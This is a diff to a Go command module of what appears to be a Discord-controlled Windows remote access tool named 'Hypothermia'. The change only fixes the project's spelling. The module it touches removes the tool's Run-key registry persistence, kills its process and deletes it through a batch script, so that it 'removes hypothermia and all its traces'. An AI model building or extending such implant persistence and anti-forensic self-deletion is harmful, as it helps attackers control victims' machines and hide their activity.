@@ -8,8 +8,8 @@ import (
 	"syscall"
 	"time"
 
-	"Hypotermia/config"
-	"Hypotermia/src/utils"
+	"Hypothermia/config"
+	"Hypothermia/src/utils"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -18,8 +18,8 @@ const (
 	wipeRegError    string = "🟥 Failed to get registry key."
 	wipeDeReglError string = "🟥 Failed to delete registry key."
 	wipePathError   string = "🟥 Failed to get the path."
-	wipeDelError    string = "🟥 Failed to delete hypotermia."
-	wipeKillError   string = "🟥 Failed to kill hypotermia."
+	wipeDelError    string = "🟥 Failed to delete hypothermia."
+	wipeKillError   string = "🟥 Failed to kill hypothermia."
 )
 
 type WipeCommand struct{}
@@ -28,7 +28,7 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	if !config.Debugging {
 		_, err := utils.GetRegistry(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-			config.HypotermiaName,
+			config.HypothermiaName,
 		)
 
 		if err != nil {
@@ -38,7 +38,7 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 
 		err = utils.DelRegistry(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-			config.HypotermiaName,
+			config.HypothermiaName,
 		)
 
 		if err != nil {
@@ -62,7 +62,7 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	content := fmt.Sprintf(
 		"@echo off\n"+
 			":check\n"+
-			"tasklist | find \"Hypotermia.exe\" >nul\n"+
+			"tasklist | find \"Hypothermia.exe\" >nul\n"+
 			"if not errorlevel 1 (\n"+
 			"  timeout /t 1 >nul\n"+
 			"  goto :check\n"+
@@ -101,5 +101,5 @@ func (*WipeCommand) Name() string {
 }
 
 func (*WipeCommand) Info() string {
-	return "removes hypotermia and all its traces"
+	return "removes hypothermia and all its traces"
 }
